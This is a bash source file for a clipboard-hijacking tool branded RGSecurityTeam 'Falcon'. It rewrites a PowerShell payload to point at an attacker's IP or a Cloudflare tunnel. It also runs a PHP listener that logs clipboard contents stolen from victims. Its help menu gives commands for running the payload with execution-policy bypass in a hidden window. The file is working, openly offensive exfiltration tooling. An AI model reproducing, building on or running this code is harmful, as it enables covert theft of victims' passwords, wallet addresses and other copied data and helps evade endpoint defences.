#!/bin/bash
# RGSecurityTeam - Clipboard Hijacker
# YouTube: www.youtube.com/@RGSecurityTeam

version="0.1"

# Colors
red="$(printf '\033[1;31m')"  
green="$(printf '\033[1;32m')"  
orange="$(printf '\033[1;93m')"
blue="$(printf '\033[1;34m')" 
cyan="$(printf '\033[1;36m')"  
white="$(printf '\033[1;37m')" 
redbg="$(printf '\033[1;41m')"
nc="$(printf '\e[0m')" #no color

## Script Dir
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

## kill process
kill_pid() {
	check_PID="php cloudflared"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}

## Clear logs files
if [ -e "clipboard_logger.ps1" ]; then
    rm clipboard_logger.ps1
fi
if [ -e ".server/clipboard_log.txt" ]; then
    cat ".server/clipboard_log.txt" >> "${SCRIPT_DIR}"/clipboard-logs/clipboard-log.txt
    # Clear logs
    > ".server/clipboard_log.txt"
    sleep 0.2
fi

## capture program terminate
terminate() {
    echo -e "\n\n${red}[${orange}!] Program terminated.${nc}"
    pkill -f "php -S" 2>/dev/null
    pkill -f cloudflared 2>/dev/null
    cat ".server/clipboard_log.txt" >> "${SCRIPT_DIR}"/clipboard-logs/clipboard-log.txt
    > ".server/clipboard_log.txt"
    sleep 0.2
    exit 0
}

trap terminate INT

## BANNER 
banner() {
echo -e "\n"
echo -e "${cyan}    ███████${orange}╗${cyan} █████${orange}╗ ${cyan}██${orange}╗${cyan}      ██████${orange}╗ ${cyan}██████${orange}╗${cyan} ███${orange}╗${cyan}   ██${orange}╗ ${nc}"
echo -e "${cyan}    ██${orange}╔════╝${cyan}██${orange}╔══${cyan}██${orange}╗${cyan}██${orange}║     ${cyan}██${orange}╔════╝${cyan}██${orange}╔═══${cyan}██${orange}╗${cyan}████${orange}╗  ${cyan}██${orange}║ ${nc}"
echo -e "${cyan}    █████${orange}╗  ${cyan}███████${orange}║${cyan}██$orange║     ${cyan}██${orange}║     ${cyan}██${orange}║   ${cyan}██${orange}║${cyan}██$orange╔${cyan}██${orange}╗ ${cyan}██${orange}║ ${nc}"
echo -e "${cyan}    ██${orange}╔══╝  ${cyan}██${orange}╔══${cyan}██${orange}║${cyan}██${orange}║     ${cyan}██${orange}║     ${cyan}██${orange}║   ${cyan}██$orange║${cyan}██${orange}║╚${cyan}██${orange}╗${cyan}██${orange}║ ${nc}"
echo -e "${cyan}    ██${orange}║     ${cyan}██${orange}║  ${cyan}██${orange}║${cyan}███████${orange}╗╚${cyan}██████${orange}╗╚${cyan}██████${orange}╔╝${cyan}██$orange║ ╚${cyan}████${orange}║ ${nc}"
echo -e "${orange}    ╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ "
echo -e "${white}${green}    Clip Board Hijacker by ${redbg}${white}RGSecurityTeam.${nc}${white} Version:$version ${nc}"
}

## Check dependencies
check_dependencies() {
    local deps=("php" "wget")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${red}[!]${white} $dep is required but not installed.${nc}"
            exit 1
        fi
    done
}

## Download Cloudflared
download_cloudflared() {
    { clear; banner; echo; }
    if [[ ! -f "cloudflared" ]]; then
        echo -e "${red}[${orange}+${red}]${green} Downloading cloudflared...${nc}"
        arch=$(uname -m)
        case $arch in
            *arm*|*Android*) url="cloudflared-linux-arm" ;;
            *aarch64*) url="cloudflared-linux-arm64" ;;
            *x86_64*) url="cloudflared-linux-amd64" ;;
            *) url="cloudflared-linux-386" ;;
        esac
        
        wget --no-check-certificate "https://github.com/cloudflare/cloudflared/releases/latest/download/$url" -O cloudflared > /dev/null 2>&1
        chmod +x cloudflared
        echo -e "${red}[${orange}+${red}]${green} Cloudflared installed.${nc}"
        { sleep 1; main_falcon; }
    fi
}


## Setup Server
manual_server(){
    { clear; banner; echo; }
    echo -e "${orange}═════════ ${blue}Falcon Started${orange} ═════════\n"
    echo -e "${cyan}[${red}+${cyan}]${white} Server running on${blue} http://$IP:$PORT"
    echo -e "${cyan}[${red}+${cyan}]${white} Log file: ${blue}${SCRIPT_DIR}/clipboard-logs/clipboard-log.txt${nc}\n"
    echo -e "${cyan}[${red}+${cyan}]${white} Waiting for clipboard data...${orange} (Ctrl+C to stop)${nc}\n"

    cd .server &&
    php -F clipboard_rec.php -S "$IP:$PORT" > /dev/null 2>&1 &
    sleep 1
    tail -f .server/clipboard_log.txt
    local tail_pid=$!

    trap "kill $tail_pid 2>/dev/null; " INT
}

## Manually setup
manual_setup(){
    { clear; banner; echo; }
    echo -e "${orange}═════════ ${blue}payload setup${orange} ═════════\n"
    read -p "${red}[${orange}+${red}]${white} Enter IP Address: ${blue}" IP
    read -p "${red}[${orange}+${red}]${white} Enter Port Number: ${blue}" PORT

    sed -i "s/^\$proto = .*/\$proto = \"http\"/" .templates/clipboard_logger.ps1
    sed -i "s/^\$cl = .*/\$cl = \":\"/" .templates/clipboard_logger.ps1
    sed -i "s/^\$ip = .*/\$ip = \"$IP\"/" .templates/clipboard_logger.ps1
    sed -i "s/^\$port = .*/\$port = \"$PORT\"/" .templates/clipboard_logger.ps1
    echo -e "\n${cyan}[${red}+${cyan}]${white} Payload Cinfigured for${blue} http://$IP:$PORT\n"
    cp .templates/clipboard_logger.ps1 "$SCRIPT_DIR"
    manual_server
}

## Cloudflare setup
cloudf_setup(){
    { clear; banner; echo; }
    echo -e "${orange}═════════ ${blue}Setup payload with cloudflared${orange} ═════════\n"
    echo -e "${orange}[${green}+${orange}]${white} Staring php server...${nc}\n"

    cd .server &&
    php -F clipboard_rec.php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 1
    echo -e "${orange}[${green}+${orange}]${white} Staring Cloudlare...${nc}\n"
    rm cf.log > /dev/null 2>&1 &
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
    sleep 12
    cf_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
    if [[ -z "$cf_link" ]]; then
        echo -e "${red}[${orange}!${red}] Direct link not generated! $(nc)"
        exit 1
    else
        # Remove https from url
        cf_link_no_https="${cf_link#https://}"
    fi
    echo -e "${orange}[${green}+${orange}]${white} setting up payload file\n"
    sed -i "s/^\$proto = .*/\$proto = \"https\"/" .templates/clipboard_logger.ps1
    sed -i "s/^\$cl = .*/\$cl = \"\"/" .templates/clipboard_logger.ps1
    sed -i "s/^\$ip = .*/\$ip = \"$cf_link_no_https\"/" .templates/clipboard_logger.ps1
    sed -i "s/^\$port = .*/\$port = \"\"/" .templates/clipboard_logger.ps1
    echo -e "${cyan}[${red}+${cyan}]${white} Payload Configured for${blue} https://$cf_link_no_https\n"
    cp .templates/clipboard_logger.ps1 "$SCRIPT_DIR"
    echo -e "${cyan}[${red}+${cyan}]${white} Waiting for clipboard data...${orange} (Ctrl+C to stop)${nc}\n"
    tail -f .server/clipboard_log.txt
    local tail_pid=$!

    trap "kill $tail_pid 2>/dev/null; " INT
}

## Monitoring
start_monitoring(){
    { clear; banner; echo; }
    echo -e "${orange}═════════ ${blue}Stating Monitoring${orange} ═════════\n"
    read -p "${red}[${orange}+${red}]${white} Enter Listener Host IP Address: ${blue}" IP
    read -p "${red}[${orange}+${red}]${white} Enter Listener Port: ${blue}" PORT
    { sleep 1; manual_server; }
}

help_menu(){
    { clear; banner; echo; }
    echo -e "${orange}═════════ ${blue}Help Menu${orange} ═════════\n"
    echo -e "${green}Run this in Powershell:"
    echo -e "${cyan}powershell -NoP -NonI -W h -Exec Bypass clipboard_logger.ps1 \n"
    echo -e "${orange}For Hidden Execution:"
    echo -ne "${cyan}Start-Process powershell -ArgumentList \"-NoProfile -ExecutionPolicy Bypass -File clipboard_logger.ps1\" -WindowStyle Hidden${nc}\n\n"
    echo -e "${red}To stop this in Powershell: "
    echo -e "${cyan}Stop-Process -Name powershell -Force${nc}\n"
    read -n 1 -s -p "Press any key to continue..."
    { clear; banner; main_falcon; }
}

## Exit Message
exit_msg(){
    { clear; banner; echo; }
    echo -e "${orange}═════════ ${blue}Thankyou${orange} ═════════\n"
    echo -e "${red} Subscribe ${white}on Youtube.${nc} www.youtube.com/@RGSecurityTeam ${nc}"

}

## Main Function
main_falcon(){
    { clear; banner; echo; }
    echo -e "${orange}═════════ ${blue}Main Menu${orange} ═════════\n"
    echo -e "${red}[${orange}01${red}]${white} Setup With Manual IP & PORT"
    echo -e "${red}[${orange}02${red}]${white} Setup With Cloudflare"
    echo -e "${red}[${orange}03${red}]${white} Start Monitoring"
    echo -e "${red}[${orange}04${red}]${white} Help Menu"
    echo -e "${red}[${orange}05${red}]${green} Exit\n"

    read -p "${cyan}[${red}+${cyan}]${white} Select option: ${blue}" choice

    case $choice in
        1 | 01)
            manual_setup;;
        2 | 03)
            cloudf_setup;;
        3 | 03)
            start_monitoring;;
        4 | 04)
            help_menu;;
        5 | 05)
            exit_msg;;
        *)
            echo -e "\n\n${red}[${orange}!${red}] Invalid option... Try Again!${nc}"; sleep 1.5; main_falcon;;
    esac
}

check_dependencies
download_cloudflared
kill_pid
main_falcon